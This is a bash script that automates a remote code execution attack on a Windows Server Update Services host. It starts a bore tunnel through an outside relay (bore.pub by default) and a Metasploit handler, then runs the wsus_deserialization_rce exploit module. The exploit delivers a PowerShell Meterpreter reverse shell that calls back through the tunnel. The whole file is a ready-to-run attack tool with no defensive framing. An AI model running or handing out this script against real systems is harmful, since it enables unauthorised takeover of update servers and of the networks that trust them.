#!/bin/bash

# wsus.sh - WSUS Exploitation Script with Bore Tunneling
# Usage: ./wsus.sh <target_ip>

if [ -z "$1" ]; then
    echo "Usage: $0 <target_ip>"
    echo "Example: $0 192.168.1.100"
    exit 1
fi

TARGET_IP="$1"
LOCAL_PORT=$((RANDOM % 10000 + 20000))

echo "[*] Starting WSUS exploitation against: $TARGET_IP"
echo "[*] Using random local port: $LOCAL_PORT"

# Ask for custom tunnel address
echo -e "\n[+] Configure Bore Tunnel Server"
echo -n "Enter tunnel server address (default: bore.pub): "
read TUNNEL_SERVER

# Set default if nothing entered
if [ -z "$TUNNEL_SERVER" ]; then
    TUNNEL_SERVER="bore.pub"
fi

echo "[*] Using tunnel server: $TUNNEL_SERVER"

# Start bore tunnel in xterm window
echo "[*] Opening bore tunnel window..."
xterm -geometry 87x12+50+50 -T "Bore Tunnel - Port $LOCAL_PORT" -e "echo '=== BORE TUNNEL ==='; echo 'Local port: $LOCAL_PORT'; echo 'Server: $TUNNEL_SERVER'; echo '=================='; echo ''; bore local $LOCAL_PORT --to $TUNNEL_SERVER" &
BORE_PID=$!

sleep 5

echo -e "\n[IMPORTANT] Check the bore tunnel window for the tunnel port"
echo -n "Enter tunnel port from $TUNNEL_SERVER: "
read TUNNEL_PORT

# Start MSF handler in xterm window
echo "[*] Opening MSF handler window..."
xterm -geometry 87x12+600+50 -T "MSF Handler - Port $LOCAL_PORT" -e "echo '=== MSF HANDLER ==='; echo 'Listening on port: $LOCAL_PORT'; echo '==================='; echo ''; msfconsole -q -x 'use exploit/multi/handler; setg lport $LOCAL_PORT; setg lhost 0.0.0.0; set payload cmd/windows/powershell/x64/meterpreter/reverse_tcp; run'" &
MSF_HANDLER_PID=$!

# Start WSUS exploit in xterm window
echo "[*] Opening WSUS exploit window..."
xterm -geometry 87x12+50+350 -T "WSUS Exploit - $TARGET_IP" -e "echo '=== WSUS EXPLOIT ==='; echo 'Target: $TARGET_IP'; echo 'Tunnel server: $TUNNEL_SERVER'; echo 'Tunnel port: $TUNNEL_PORT'; echo '===================='; echo ''; msfconsole -q -x 'use exploit/windows/http/wsus_deserialization_rce; setg lhost $TUNNEL_SERVER; setg lport $TUNNEL_PORT; set verbose true; set wfsdelay 900; set rhosts $TARGET_IP; set payload cmd/windows/powershell/x64/meterpreter/reverse_tcp; exploit'" &
WSUS_PID=$!

echo -e "\n[+] All windows opened successfully!"
echo "[*] Window positions (87x12 size, no overlapping):"
echo "    - Bore tunnel: top-left (50,50)"
echo "    - MSF handler: top-right (600,50)"
echo "    - WSUS exploit: bottom-left (50,350)"
echo ""
echo "[*] Local port: $LOCAL_PORT"
echo "[*] Tunnel server: $TUNNEL_SERVER"
echo "[*] Tunnel port: $TUNNEL_PORT"
echo "[*] Target: $TARGET_IP"
echo ""
echo "[*] Process IDs:"
echo "    Bore tunnel: $BORE_PID"
echo "    MSF handler: $MSF_HANDLER_PID"
echo "    WSUS exploit: $WSUS_PID"

# Wait for user
echo -e "\n[*] Press Enter when you want to cleanup and exit..."
read

# Forceful cleanup
echo "[*] Forceful cleanup..."
echo "[*] Killing all bore processes..."
kill -9 $BORE_PID 2>/dev/null
pkill -9 -f "bore local" 2>/dev/null
pkill -9 -f "bore.*--to" 2>/dev/null
pkill -9 bore 2>/dev/null

echo "[*] Killing all msfconsole processes..."
kill -9 $MSF_HANDLER_PID 2>/dev/null
kill -9 $WSUS_PID 2>/dev/null
pkill -9 msfconsole 2>/dev/null
pkill -9 ruby 2>/dev/null

echo "[*] Closing all xterm windows..."
pkill -9 xterm 2>/dev/null

echo "[âœ“] Cleanup complete! All processes terminated."